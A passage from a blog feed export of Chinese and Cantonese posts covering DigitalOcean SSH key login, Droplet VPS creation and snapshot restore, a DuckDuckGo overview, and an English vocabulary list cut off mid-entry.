<img src="/2022/01/28/Debian-user-is-not-in-the-sudoers-file-This-incident-will-be-reported/ok.png" class="">

<p>完成。</p>
<h2 id="完整示範"><a href="#完整示範" class="headerlink" title="完整示範"></a>完整示範</h2><img src="/2022/01/28/Debian-user-is-not-in-the-sudoers-file-This-incident-will-be-reported/all.gif" class="">]]></content>
      <categories>
        <category>Debian</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Digitalocean - 使用 SSH Keys 登入免用密碼加強你的伺服器安全性</title>
    <url>/2022/07/11/Digitalocean-ssh-keys-login-without-password/</url>
    <content><![CDATA[<img src="/img/Post/image/digitalocean/DigitalOcean_logo.svg" width="200px"/>

<h1 id="什麼是-SSH-Key"><a href="#什麼是-SSH-Key" class="headerlink" title="什麼是 SSH Key"></a>什麼是 SSH Key</h1><p>S​​SH key 是一種身份驗證方法，用於訪問系統之間的加密連接，然後最終使用該連接來管理遠程系統。</p>
<p>在用戶密鑰集中，私鑰保留在用於訪問遠程服務器上（你的個人電腦內），並用於解密在 SSH 協議中交換的信息。<br>私鑰不應該與任何人共享，由用戶擁有，並且私鑰通過密碼來保護。公鑰用於加密信息，可以共享，供用戶和遠程服務器使用，在服務器端，公鑰保存在一個包含授權公鑰列表的文件中。<br>在用戶方面，公共 SSH 密鑰存儲在 SSH 密鑰管理軟件或他們計算機上的文件中。</p>
<p>當產生 SSH Key (ssh-keygen) 的時候，會同時產生 Public Key (公鑰) 與 Private Key(私鑰) 兩個檔案，公鑰與私鑰會透過加密方式確定後，如果能符合即代表驗證成功，成功後就能登入至你的遠程系統。</p>
<p><img src="sshkeys.png"></p>
<h1 id="如何產生-SSH-Keys？"><a href="#如何產生-SSH-Keys？" class="headerlink" title="如何產生 SSH Keys？"></a>如何產生 SSH Keys？</h1><p>如要使用，你電腦必須有相應的程式，就例如 Windows 的話原本已經預設有安裝 ssh，可以不用再安裝，只需簡單輸入以下的指令</p>
<p>輸入後他會要求你輸入路徑這些內容，全部按下鍵盤 <code>Enter</code> 即可。 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure>

<p><img src="ssh-keygen.gif"></p>
<h2 id="回到-DigitalOcean"><a href="#回到-DigitalOcean" class="headerlink" title="回到 DigitalOcean"></a>回到 DigitalOcean</h2><p>你應該是正在進行建立 VPS 程序，直接到 <code>Authentication</code> 選用 <code>SSH keys</code>，然後按下下方的按鈕 <code>New SSH Key</code>。</p>
<div class="note info flat">
    說明：使用這方法的話，會將密碼登入的方式禁止，然後只能使用 SSH Key 登入，大大加強了安全性。
</div>

<p>另外，如果你是後來才想加入 SSH Keys 登入的話，這個文章的內容對於後期修改為使用 SSH Keys 的人是一個不齊全的文章，本篇文章是針對正在建立 VPS Droplets 的人而編寫的，如果要從頭開始說明如何關閉密碼登入，使用 SSH Keys 登入的話，可以看這篇文章：</p>
<p><img src="1-1.gif"></p>
<h2 id="複製產生後的-SSH-Keys"><a href="#複製產生後的-SSH-Keys" class="headerlink" title="複製產生後的 SSH Keys"></a>複製產生後的 SSH Keys</h2><p>使用指令台輸入以下指令查看產生 keys，然後將剛剛產生後的 keys 放在 textbox 內，輸入名稱，再按下確定 (<code>Add SSH Key</code>)。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat .\.ssh\id_rsa.pub</span><br></pre></td></tr></table></figure>

<p><img src="2-2.gif"></p>
<p>完成後會看到已成功加入你的 public key，這樣一來就只有擁有這條 key 的人才能登入伺服器，安全性大大加強了。</p>
<p><img src="3-3.gif"></p>
<h2 id="登入你的-SSH-Server"><a href="#登入你的-SSH-Server" class="headerlink" title="登入你的 SSH Server"></a>登入你的 SSH Server</h2><p>登入是怎樣運作的？ SSH 協議啟動與遠程系統的連接，然後協議和指定的用戶名將告訴遠程服務器使用哪個公鑰來驗證您的身份，即是你剛剛產生的 ssh keys。</p>
<p>另外，每當登入一部電腦未認證的遠程服務器後，都會問你是否信任該遠程服務器，這種情況下只需要輸入 <code>yes</code> 確定登入就可以了，然後每當證認後，位於 <code>.ssh</code> 目錄內會產生一個檔案命名為 <code>known_hosts</code> 的檔案，裡面會為你新增一個你遠程服務器的資訊。</p>
<p><img src="known_hosts.gif"></p>
<p>現在，使用指令台輸入您的 ssh 用戶名和遠程服務器的 IP，格式如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh username@ip_address</span><br></pre></td></tr></table></figure>

<p><img src="login.gif"></p>
<p>可以看到已經成功登入至你的遠程服務器中，不需任何密碼登入，這樣一來就更安全使用 SSH Server 了，減低了被入侵的風險。</p>
<h1 id="檔案說明"><a href="#檔案說明" class="headerlink" title="檔案說明"></a>檔案說明</h1><p>產生 ssh keys 後會出現二個檔案，包括是：</p>
<ul>
<li>id_rsa - 私人 Keys</li>
<li>id_rsa.pub - 公開 Keys</li>
</ul>
<p>登入 ssh server 會產生一個檔案，包括是：</p>
<ul>
<li>known_hosts - 你裝置的資料，資料包括遠程服務器 IP 位置，keys。</li>
</ul>
<p><img src="file-3.png"></p>
<h1 id="不用複製-key-到-SSH-Server-嗎？"><a href="#不用複製-key-到-SSH-Server-嗎？" class="headerlink" title="不用複製 key 到 SSH Server 嗎？"></a>不用複製 key 到 SSH Server 嗎？</h1><p>正常來說如果你要使用 SSH Keys 登入的話你是需要在 <code>~/.ssh/</code> 內新增一個檔案叫 <code>authorized_keys</code>，然後裡面輸入你的 public key，但是使用 DigitalOcean 內建功能新增的話，他會直接為你在檔案內加入內容，免了你自行新增檔案的步驟，如果想查看內容，只需登入至你的遠程服務器內，然後輸入以下指令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<p><img src="cat_authorized_keys.gif"></p>
<h1 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h1><p><a href="https://www.digitalocean.com/community/tutorials/ssh-essentials-working-with-ssh-servers-clients-and-keys#generating-and-working-with-ssh-keys=">https://www.digitalocean.com/community/tutorials/ssh-essentials-working-with-ssh-servers-clients-and-keys#generating-and-working-with-ssh-keys=</a><br><a href="https://docs.github.com/en/authentication/connecting-to-github-with-ssh">https://docs.github.com/en/authentication/connecting-to-github-with-ssh</a><br><a href="https://codecharms.me/posts/security-ssh">https://codecharms.me/posts/security-ssh</a><br><a href="https://en.wikipedia.org/wiki/Public_key_infrastructure">https://en.wikipedia.org/wiki/Public_key_infrastructure</a><br><a href="https://jumpcloud.com/blog/what-are-ssh-keys">https://jumpcloud.com/blog/what-are-ssh-keys</a></p>
]]></content>
      <categories>
        <category>Digitalocean info</category>
        <category>Droplet</category>
      </categories>
      <tags>
        <tag>Server</tag>
        <tag>Digitalocean</tag>
        <tag>VPS Server</tag>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title>Digitalocean - 建立 Droplets VPS Server</title>
    <url>/2022/07/10/Digitalocean-create-droplets-cloud-server-vps/</url>
    <content><![CDATA[<img src="/img/Post/image/digitalocean/DigitalOcean_logo.svg" width="200px"/>

<h1 id="Digitalocean"><a href="#Digitalocean" class="headerlink" title="Digitalocean"></a>Digitalocean</h1><p><a href="https://www.digitalocean.com/">Digitalocean</a> 讓您可以創建、自動化和管理強大的雲服務器基礎架構，並具有開箱即用的功能，例如浮動 IP 地址、共享專用網絡、第 1 層帶寬、團隊帳戶。<br>另外，DigitalOcean 最便宜的雲託管計劃是每月 4.00 USD (512RAM)。</p>
<h1 id="第一步-新增新的-Project"><a href="#第一步-新增新的-Project" class="headerlink" title="第一步 - 新增新的 Project"></a>第一步 - 新增新的 Project</h1><p>這邊我會使用 <a href="https://www.digitalocean.com/">DigitalOcean</a>，申請和輸入付款資料就不多說明了，如果連申請帳號都不懂，那麼真的很難繼續下去…</p>
<p>直接跳到主頁，首先新增一個用來建立 VPS 的 Project，名稱和資料隨便就好了，你認到就可以。</p>
<p><img src="1-1.png"></p>
<h2 id="第二步-新增-VPS-Server"><a href="#第二步-新增-VPS-Server" class="headerlink" title="第二步 - 新增 VPS Server"></a>第二步 - 新增 VPS Server</h2><p>於右上角按 <code>Create</code> 後按下第一個選項 <code>Droplets</code>。</p>
<p><img src="1.png"></p>
<h2 id="第三步-選擇伺服器-Distro"><a href="#第三步-選擇伺服器-Distro" class="headerlink" title="第三步 - 選擇伺服器 Distro"></a>第三步 - 選擇伺服器 Distro</h2><p>這邊會示範使用 Ubuntu 20.04 LTS x64 版本，選擇他就繼續下一步 ~</p>
<p><img src="2.png"></p>
<h2 id="第四步-選擇伺服器配置"><a href="#第四步-選擇伺服器配置" class="headerlink" title="第四步 - 選擇伺服器配置"></a>第四步 - 選擇伺服器配置</h2><p>配置的方面，選擇一個你想要的就好。</p>
<p><img src="3.png"></p>
<h2 id="第五步-額外硬碟空間"><a href="#第五步-額外硬碟空間" class="headerlink" title="第五步 - 額外硬碟空間"></a>第五步 - 額外硬碟空間</h2><p>這邊會問你是否需要額外的硬碟空間，如果不需要的話直接跳過就可以了。</p>
<p>另外，原本最低的是 10GB Disk，基本上這個數量如果不是超多媒體的話一般的伺服器是夠用的，加上這邊的 Disk 是可以後期再加的。</p>
<p>還有，如果要加的話他的說明是 10GB = 1$/mo, $0.001/hour。</p>
<p><img src="4-2.png"></p>
<h2 id="第六步-選擇伺服器位置"><a href="#第六步-選擇伺服器位置" class="headerlink" title="第六步 - 選擇伺服器位置"></a>第六步 - 選擇伺服器位置</h2><p>選擇一個你想要的國家吧，這邊我選擇新咖波，原因比較近台灣和香港的位置，連線速度比較理想 ~</p>
<p><img src="4.png"></p>
<h2 id="第七步-密碼認證"><a href="#第七步-密碼認證" class="headerlink" title="第七步 - 密碼認證"></a>第七步 - 密碼認證</h2><p>VPC Netork，這個可以不用理就好 ~</p>
<p>你可以選擇 SSH Keys 或者使用純密碼建立你的 SSH 密碼，我這邊會使用 <code>Password</code> 繼續，輸入你想要的密碳繼續下一步。</p>
<p><img src="5.png"></p>
<h2 id="第八步-另外選項"><a href="#第八步-另外選項" class="headerlink" title="第八步 - 另外選項"></a>第八步 - 另外選項</h2><p>這邊有幾樣東西你可以選擇加入至你的伺服器內：</p>
<ul>
<li>Enable backups - 自動備份你的伺服器 (但需要另外加錢)</li>
<li>IPV6 - 開啟 IPV6 連線</li>
<li>Monitoring - 即時查看 Server 狀態</li>
<li>User Data</li>
</ul>
<p>我這邊示範就全部都不使用了，直接跳過就好。</p>
<p><img src="6.png"></p>
<h2 id="第九步-建立多少部伺服器和決定伺服器名稱"><a href="#第九步-建立多少部伺服器和決定伺服器名稱" class="headerlink" title="第九步 - 建立多少部伺服器和決定伺服器名稱"></a>第九步 - 建立多少部伺服器和決定伺服器名稱</h2><p>他會問你要建立多小部 Droplets (VPS)，只使用一部就好。<br>名稱你選擇一個你喜歡的名字就好。<br>Tags 的話是方便你尋找這 VPS，不加也沒關係<br>Select Project 的話是要將這個 Droplets 放在哪一個，因應他是將每個 Server 都會分類，而這邊只有一個的話就不用管，繼續直接按下 <code>Create Droplet</code>。</p>
<p><img src="7.png"></p>
<h2 id="最後一步-等待建立完成-VPS"><a href="#最後一步-等待建立完成-VPS" class="headerlink" title="最後一步 - 等待建立完成 VPS"></a>最後一步 - 等待建立完成 VPS</h2><p>現在會重定向位置到你的主頁，然後你會看到你的伺服器正在建立中… 等待大概 20 秒左右就 OK 了。</p>
<p><img src="8.png"></p>
<h2 id="完成建立-VPS"><a href="#完成建立-VPS" class="headerlink" title="完成建立 VPS"></a>完成建立 VPS</h2><p>你現在可以看到你的伺服器 IP 位置是多小。</p>
<p><img src="9.png"></p>
]]></content>
      <categories>
        <category>Digitalocean info</category>
        <category>Droplet</category>
      </categories>
      <tags>
        <tag>Server</tag>
        <tag>Digitalocean</tag>
        <tag>VPS Server</tag>
      </tags>
  </entry>
  <entry>
    <title>Digitalocean - 儲存現時狀態和還原狀態</title>
    <url>/2022/07/12/Digitalocean-take-snapshots-and-restore/</url>
    <content><![CDATA[<img src="/img/Post/image/digitalocean/DigitalOcean_logo.svg" width="200px"/>

<h1 id="咩係-Snapshots？"><a href="#咩係-Snapshots？" class="headerlink" title="咩係 Snapshots？"></a>咩係 Snapshots？</h1><p>首先喺用之前，你要明白咩係 Snapshots，我會用一個情況黎解釋呢個 terms，喺現實世界，好多野你做左冇得返轉頭，你冇得打回原型，例如食左既野冇得再喺個胃拎返出黎，做左啲戇鳩野俾人笑一世，總之一句講哂，就係你冇得返去你未做之前既狀態。</p>
<p>電腦 Snapshots 就係一個可以俾你打回原型，返返去 save point 個個位，即係好似打機咁，你喺呢度 create 一個 point，你想之後返返去讀點？無問題。你想返返去之前個位？無問題。<br>你只要有 save 到個 point 就可以返去喇.</p>
<h1 id="留意返-用呢個功能其實係收錢㗎-xd"><a href="#留意返-用呢個功能其實係收錢㗎-xd" class="headerlink" title="留意返 用呢個功能其實係收錢㗎 xd"></a>留意返 用呢個功能其實係收錢㗎 xd</h1><p>其實如果要用呢個功能既話 DigitalOcean 係會計你錢㗎，佢係 0.06 美金/GiB/月費，然後 Droplet 每GB 既 Data 會最多需要用一分鐘時間去進行處理，仲有就係會根據你而加部機入面有幾多 GB 再計 0.06 美金/Gib/月.<br>不過我呢篇文都係做個示範講解下點用 Snapshots 姐 haha</p>
<p><img src="OF.png"></p>
<h1 id="第一步-入-DigitalOcean-Droplets-主頁"><a href="#第一步-入-DigitalOcean-Droplets-主頁" class="headerlink" title="第一步 - 入 DigitalOcean Droplets 主頁"></a>第一步 - 入 DigitalOcean Droplets 主頁</h1><p>呢度我會預你本身已經起好左一部機黎用，至於點樣起部機唔講啦，<br>如果唔識既話可以睇返我以前呢篇文：<a href="/2022/07/10/Digitalocean-create-droplets-cloud-server-vps/">Digitalocean - 建立 Droplets VPS Server</a></p>
<p>返返黎先，我地入呢個位，喺左邊既咩料入面撳 <code>Droplets</code>，然後撳返你要整 <code>Snapshots</code> 個部機.</p>
<p><img src="1.gif"></p>
<h1 id="第二步-Dashboard-入-Snapshots-個位"><a href="#第二步-Dashboard-入-Snapshots-個位" class="headerlink" title="第二步 - Dashboard 入 Snapshots 個位"></a>第二步 - Dashboard 入 Snapshots 個位</h1><p>黎到呢個位會入左去你部機既 Dashboard，喺下面張圖你會見到我紅色圈起左 <code>Snapshots</code>，撳佢一下之後就去下一步.</p>
<p><img src="dashboard_1.gif"></p>
<h1 id="第三步-Take-live-snapshot"><a href="#第三步-Take-live-snapshot" class="headerlink" title="第三步 - Take live snapshot"></a>第三步 - Take live snapshot</h1><p>喺 save point 之前，俾大家睇下我部機入面有乜野先，之後會加啲 file 喺部機入面，再試下 restore 佢返去 save point 位.</p>
<p>我喺部機既 shell 打 <code>ls -la</code> 睇下呢個 path 有乜料到先.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -la</span><br></pre></td></tr></table></figure>

<p><img src="lsla.gif"></p>
<p>我地可以睇到寫住 total 得 <code>32</code>，而加我地將部機熄左先，咁做係確保數據係一致性，打呢句指令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo shutdown -h now</span><br></pre></td></tr></table></figure>

<p>而加我地去返 snapshot 個位，幫呢個 snapshot 改個名，然後再撳 <code>take live snapshot</code>，撳完之後等佢 load 一陣就可以見到架啦 ~</p>
<p><img src="tk.gif"></p>
<p>load 好喇 ~~</p>
<p><img src="tk-2.gif"></p>
<h1 id="第四步-試下起啲野"><a href="#第四步-試下起啲野" class="headerlink" title="第四步 - 試下起啲野"></a>第四步 - 試下起啲野</h1><p>我地而加登入返個 shelll，然後試下起野，我會起一個 folder 叫 <code>testing</code>.</p>
<p><img src="mkdir.gif"></p>
<h1 id="第五步-Restore-Droplets"><a href="#第五步-Restore-Droplets" class="headerlink" title="第五步 - Restore Droplets"></a>第五步 - Restore Droplets</h1><p>而加我地返返去 take snapshot 個位，喺頭先起左一個 snapshots 個度，最右邊撳 <code>More</code>，撳完之後你會見到 <code>Restore Droplet</code>.</p>
<p><img src="restore.gif"></p>
<p>撳完之後佢會問你係咪 confirm 要 restroe? 你撳 <code>Restore Droplet</code> 繼續.</p>
<p><img src="restore-3.gif"></p>
<p>呢個 moment 只需要等一陣就得 (大概廿秒)，而喺同一時間，你會發現你個 shell 係打唔到野，然後過一陣會顯示 Connection reset，個原因係 digitalocean 個系統收到風要將你部機 restore，咁佢就會幫你熄機進行呢個程序.</p>
<p><img src="restore-4.gif"></p>
<h1 id="最後一步-登入系統睇下係咪真係成功左"><a href="#最後一步-登入系統睇下係咪真係成功左" class="headerlink" title="最後一步 - 登入系統睇下係咪真係成功左"></a>最後一步 - 登入系統睇下係咪真係成功左</h1><p>我地登入再打 <code>ls -la</code> 睇下係咪未 save 左個陣既狀態先.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -la</span><br></pre></td></tr></table></figure>

<p><img src="loginlala.gif"></p>
<p>成功左喇，可以見到我頭先 create 既 folder <code>testing</code> 已經唔見左，證明左已經將個狀態變返去之前個個狀態 :3<br>教學完畢 :3</p>
<h1 id="剷-Snapshots"><a href="#剷-Snapshots" class="headerlink" title="剷 Snapshots"></a>剷 Snapshots</h1><p>話哂都要計錢，咁假設你唔想再 hold 住既話，我地去返 digitalocean snapshots 個位，撳 <code>More</code> 之後撳 <code>Delete</code> 就得㗎啦.</p>
<p><img src="delete.gif"></p>
<p>之後佢會問你係咪真係要 <code>delete</code>，因為呢個操作係冇得返轉頭，delete 左就冇，撳 <code>Delete Snapshot</code> 繼續.</p>
<p><img src="delete-2.gif"></p>
<p>已經成功剷左呢個 snapshot 啦</p>
<p><img src="delete-done.png"></p>
<h1 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h1><p><a href="https://docs.digitalocean.com/products/droplets/how-to/resize/#estimated-downtime">https://docs.digitalocean.com/products/droplets/how-to/resize/#estimated-downtime</a><br><a href="https://docs.digitalocean.com/products/images/snapshots/">https://docs.digitalocean.com/products/images/snapshots/</a><br><a href="https://docs.digitalocean.com/products/images/snapshots/quickstart/">https://docs.digitalocean.com/products/images/snapshots/quickstart/</a></p>
]]></content>
      <categories>
        <category>Digitalocean info</category>
        <category>Droplet</category>
      </categories>
      <tags>
        <tag>Server</tag>
        <tag>Digitalocean</tag>
        <tag>VPS Server</tag>
        <tag>廣東話粵文講解</tag>
      </tags>
  </entry>
  <entry>
    <title>DuckDuckgo - 反追蹤器的網路搜索引擎</title>
    <url>/2022/05/24/DuckDuckgo-SearchEngine/</url>
    <content><![CDATA[<p align="center">
    <img alt="Session Messenger" src="cover.png" width="200px"/>
    <h1 align="center">DuckDuckGo (DDG)</h1>
</p>

<h1 id="DuckDuckGO"><a href="#DuckDuckGO" class="headerlink" title="DuckDuckGO"></a>DuckDuckGO</h1><p>DuckDuckGo (DDG) 是一個互聯網搜索引擎，強調反追蹤的一個互聯網搜索引擎，而 TorBrowser 預設也是使用 DuckDuckGo 做 Search Engine。</p>
<p>【網站】：<a href="https://duckduckgo.com/">https://duckduckgo.com/</a></p>
<img src="/2022/05/24/DuckDuckgo-SearchEngine/DDG.png" class="">


<h1 id="為什麼使用-DuckDuckGo"><a href="#為什麼使用-DuckDuckGo" class="headerlink" title="為什麼使用 DuckDuckGo"></a>為什麼使用 DuckDuckGo</h1><p>在網路世界，追蹤器幾乎所有大公司也存在，但是總有幾間公司會強調不追蹤，不收集用戶資料，不收集用戶數據，就像 Mullvad VPN 一樣，而 DuckDuckGo 就是一個聱稱不追蹤的 Search Engine。</p>
<p>使用 Google Search 的時候，Google 會將你的搜索記錄上傳至大數據中，裝置沒有裝設有反追蹤的插件的時候，那麼你的數據就會被 Google 看到，這樣是不是很沒有安全感？ 當你的個人私隱受侵犯的時候，這個問題是非常大的，所以為什麼要使用一些沒有追蹤的東西。 </p>
<p>而如果大家想知道有什麼反追蹤 Privacy 向的插件，<br>可以參考這篇文章： <a href="/2021/12/11/web-extensions-privacy/">瀏覽器插件推薦 - 保護你上網安全 (Privacy)</a></p>
<h1 id="支援系統"><a href="#支援系統" class="headerlink" title="支援系統"></a>支援系統</h1><p>官方有轉用的程式使用 duckduckgo：</p>
<ul>
<li><a href="https://play.google.com/store/apps/details?id=com.duckduckgo.mobile.android&hl=en_SG&gl=US">Android 的按這裡</a></li>
<li><a href="https://apps.apple.com/us/app/duckduckgo-privacy-browser/id663592361">Apple 的按這裡</a></li>
</ul>
<h1 id="瀏覽器插件"><a href="#瀏覽器插件" class="headerlink" title="瀏覽器插件"></a>瀏覽器插件</h1><p><a href="https://addons.mozilla.org/en-US/firefox/addon/duckduckgo-for-firefox/">https://addons.mozilla.org/en-US/firefox/addon/duckduckgo-for-firefox/</a></p>
<img src="/2022/05/24/DuckDuckgo-SearchEngine/ddg-addons.png" class="">]]></content>
      <categories>
        <category>匿名</category>
      </categories>
      <tags>
        <tag>SearchEngine</tag>
      </tags>
  </entry>
  <entry>
    <title>English - 生字列表</title>
    <url>/2021/12/21/English-N/</url>
    <content><![CDATA[<h1 id="連接詞，詞語"><a href="#連接詞，詞語" class="headerlink" title="連接詞，詞語"></a>連接詞，詞語</h1><p>以下為實用詞語列表</p>
<h2 id="相反，正相反，剛剛相反，恰恰相反"><a href="#相反，正相反，剛剛相反，恰恰相反" class="headerlink" title="相反，正相反，剛剛相反，恰恰相反"></a>相反，正相反，剛剛相反，恰恰相反</h2><ul>
<li>on the contrary</li>
</ul>
<h2 id="不正確的，錯誤地"><a href="#不正確的，錯誤地" class="headerlink" title="不正確的，錯誤地"></a>不正確的，錯誤地</h2><ul>
<li>incorrectly</li>
</ul>
<h2 id="武器"><a href="#武器" class="headerlink" title="武器"></a>武器</h2><ul>
<li>weapon</li>
</ul>
<h2 id="傷害"><a href="#傷害" class="headerlink" title="傷害"></a>傷害</h2><ul>
<li>hurt</li>
</ul>
<h2 id="傷害自己"><a href="#傷害自己" class="headerlink" title="傷害自己"></a>傷害自己</h2><ul>
<li>hurt yourself</li>
</ul>
<h2 id="因此，因而，所以"><a href="#因此，因而，所以" class="headerlink" title="因此，因而，所以"></a>因此，因而，所以</h2><ul>
<li>therefore</li>
<li>for that reason</li>
</ul>
<h2 id="為自己"><a href="#為自己" class="headerlink" title="為自己"></a>為自己</h2><ul>
<li>for myself</li>
</ul>
<h2 id="問自己"><a href="#問自己" class="headerlink" title="問自己"></a>問自己</h2><ul>
<li>ask myself</li>
</ul>
<h2 id="用得恰當，適當地使用"><a href="#用得恰當，適當地使用" class="headerlink" title="用得恰當，適當地使用"></a>用得恰當，適當地使用</h2><ul>
<li>used properly</li>
</ul>
<h2 id="適當"><a href="#適當" class="headerlink" title="適當"></a>適當</h2><ul>
<li>properly</li>
</ul>
<h2 id="不要再傷害自己了"><a href="#不要再傷害自己了" class="headerlink" title="不要再傷害自己了"></a>不要再傷害自己了</h2><ul>
<li>don’t hurt yourself</li>
</ul>
<h2 id="自己"><a href="#自己" class="headerlink" title="自己"></a>自己</h2><ul>
<li>oneself</li>
</ul>
<h2 id="總括而言"><a href="#總括而言" class="headerlink" title="總括而言"></a>總括而言</h2><ul>
<li>All in all</li>
</ul>
<h2 id="發揮"><a href="#發揮" class="headerlink" title="發揮"></a>發揮</h2><ul>
<li>Perform</li>
</ul>
<h2 id="其實，事實上"><a href="#其實，事實上" class="headerlink" title="其實，事實上"></a>其實，事實上</h2><ul>
<li>actually</li>
<li>in fact</li>
<li>as a matter of fact</li>
</ul>
<h2 id="允許"><a href="#允許" class="headerlink" title="允許"></a>允許</h2><ul>
<li>allow</li>
<li>empower</li>
</ul>
<h2 id="不同的"><a href="#不同的" class="headerlink" title="不同的"></a>不同的</h2><ul>
<li>different</li>
</ul>
<h2 id="例如，比如"><a href="#例如，比如" class="headerlink" title="例如，比如"></a>例如，比如</h2><ul>
<li>such as</li>
</ul>
<h2 id="虛擬世界"><a href="#虛擬世界" class="headerlink" title="虛擬世界"></a>虛擬世界</h2><ul>
<li>virtual world</li>
</ul>
<h2 id="認識，遇到，見，會合，見面"><a href="#認識，遇到，見，會合，見面" class="headerlink" title="認識，遇到，見，會合，見面"></a>認識，遇到，見，會合，見面</h2><ul>
<li>meet</li>
</ul>
<h2 id="方面"><a href="#方面" class="headerlink" title="方面"></a>方面</h2><ul>
<li>aspects</li>
</ul>
<h2 id="知識"><a href="#知識" class="headerlink" title="知識"></a>知識</h2><ul>
<li>knowledge </li>
</ul>
<h2 id="而且"><a href="#而且" class="headerlink" title="而且"></a>而且</h2><ul>
<li>Moreover</li>
</ul>
<h2 id="增加，提高，增強"><a href="#增加，提高，增強" class="headerlink" title="增加，提高，增強"></a>增加，提高，增強</h2><ul>
<li>increase</li>
<li>improve</li>
<li>raise </li>
</ul>
<h2 id="放大"><a href="#放大" class="headerlink" title="放大"></a>放大</h2><ul>
<li>amplification</li>
<li>zoom</li>
</ul>
<h2 id="影響"><a href="#影響" class="headerlink" title="影響"></a>影響</h2><ul>
<li>affect</li>
</ul>
<h2 id="涉及"><a href="#涉及" class="headerlink" title="涉及"></a>涉及</h2><ul>
<li>involve</li>
</ul>
<h2 id="包括"><a href="#包括" class="headerlink" title="包括"></a>包括</h2><ul>
<li>include</li>
</ul>
<h2 id="雖然"><a href="#雖然" class="headerlink" title="雖然"></a>雖然</h2><ul>
<li>Although</li>
</ul>
<h2 id="或者"><a href="#或者" class="headerlink" title="或者"></a>或者</h2><ul>
<li>or</li>
</ul>
<h2 id="因此"><a href="#因此" class="headerlink" title="因此"></a>因此</h2><ul>
<li>thus</li>
</ul>
<h2 id="另外"><a href="#另外" class="headerlink" title="另外"></a>另外</h2><ul>
<li>In addition</li>
</ul>
<h2 id="個人方面"><a href="#個人方面" class="headerlink" title="個人方面"></a>個人方面</h2><ul>
<li>On the personal side</li>
<li>personally</li>
</ul>
<h2 id="沉溺"><a href="#沉溺" class="headerlink" title="沉溺"></a>沉溺</h2><ul>
<li>Indulgence</li>
</ul>
<h2 id="如今，現今"><a href="#如今，現今" class="headerlink" title="如今，現今"></a>如今，現今</h2><ul>
<li>Nowadays</li>
</ul>
<h2 id="出現"><a href="#出現" class="headerlink" title="出現"></a>出現</h2><ul>
<li>advent</li>
</ul>
<h2 id="大幅度地，大大增加了，大大增加，大大地"><a href="#大幅度地，大大增加了，大大增加，大大地" class="headerlink" title="大幅度地，大大增加了，大大增加，大大地"></a>大幅度地，大大增加了，大大增加，大大地</h2><ul>
<li>dramatically </li>
</ul>
<h2 id="健康狀況"><a href="#健康狀況" class="headerlink" title="健康狀況"></a>健康狀況</h2><ul>
<li>health status</li>
</ul>
<h2 id="考試"><a href="#考試" class="headerlink" title="考試"></a>考試</h2><ul>
<li>exam</li>
</ul>
<h2 id="自動過濾"><a href="#自動過濾" class="headerlink" title="自動過濾"></a>自動過濾</h2><ul>
<li>Automatically filter</li>
</ul>
<h2 id="控制自己"><a href="#控制自己" class="headerlink" title="控制自己"></a>控制自己</h2><ul>
<li>control themselves</li>
</ul>
<h2 id="不樂於，不積極"><a href="#不樂於，不積極" class="headerlink" title="不樂於，不積極"></a>不樂於，不積極</h2><ul>
<li>Not actively</li>
</ul>
<h2 id="一落千丈，暴跌"><a href="#一落千丈，暴跌" class="headerlink" title="一落千丈，暴跌"></a>一落千丈，暴跌</h2><ul>
<li>Plummeted</li>
</ul>
<h2 id="表現"><a href="#表現" class="headerlink" title="表現"></a>表現</h2><ul>
<li>Performance</li>
</ul>
<h2 id="無論"><a href="#無論" class="headerlink" title="無論"></a>無論</h2><ul>
<li>whether</li>
</ul>
<h2 id="社會"><a href="#社會" class="headerlink" title="社會"></a>社會</h2><ul>
<li>Society</li>
</ul>
<h2 id="不成熟的頭腦"><a href="#不成熟的頭腦" class="headerlink" title="不成熟的頭腦"></a>不成熟的頭腦</h2><ul>
<li>immaturity mind</li>
</ul>
<h2 id="錯誤的成長"><a href="#錯誤的成長" class="headerlink" title="錯誤的成長"></a>錯誤的成長</h2><ul>
<li>wrong growing</li>
</ul>
<h2 id="引誘，餌"><a href="#引誘，餌" class="headerlink" title="引誘，餌"></a>引誘，餌</h2><ul>
<li>lure</li>
</ul>
<h2 id="沉迷"><a href="#沉迷" class="headerlink" title="沉迷"></a>沉迷</h2><ul>
<li>indulge in</li>
</ul>
<h2 id="造成"><a href="#造成" class="headerlink" title="造成"></a>造成</h2><ul>
<li>causing</li>
</ul>
<h2 id="情況"><a href="#情況" class="headerlink" title="情況"></a>情況</h2><ul>
<li>Situation</li>
</ul>
<h2 id="無數"><a href="#無數" class="headerlink" title="無數"></a>無數</h2><ul>
<li>countless</li>
</ul>
<h2 id="好處"><a href="#好處" class="headerlink" title="好處"></a>好處</h2><ul>
<li>advantages</li>
<li>benefits</li>
</ul>
<h2 id="方面-1"><a href="#方面-1" class="headerlink" title="方面"></a>方面</h2><ul>
<li>aspects</li>
</ul>
<h2 id="拓寬視野"><a href="#拓寬視野" class="headerlink" title="拓寬視野"></a>拓寬視野</h2><ul>
<li>broaden the horizons</li>
</ul>
<h2 id="大概"><a href="#大概" class="headerlink" title="大概"></a>大概</h2><ul>
<li>probably</li>
</ul>
<hr>
<h1 id="英文實用句子-例子"><a href="#英文實用句子-例子" class="headerlink" title="英文實用句子 (例子)"></a>英文實用句子 (例子)</h1><h2 id="學生長期對著虛擬網絡世界"><a href="#學生長期對著虛擬網絡世界" class="headerlink" title="學生長期對著虛擬網絡世界"></a>學生長期對著虛擬網絡世界</h2><ul>
<li>Student faces the virtual network world for a long time</li>
</ul>
<h2 id="不正確使用社交媒體也會影響你的健康狀況"><a href="#不正確使用社交媒體也會影響你的健康狀況" class="headerlink" title="不正確使用社交媒體也會影響你的健康狀況"></a>不正確使用社交媒體也會影響你的健康狀況</h2><ul>
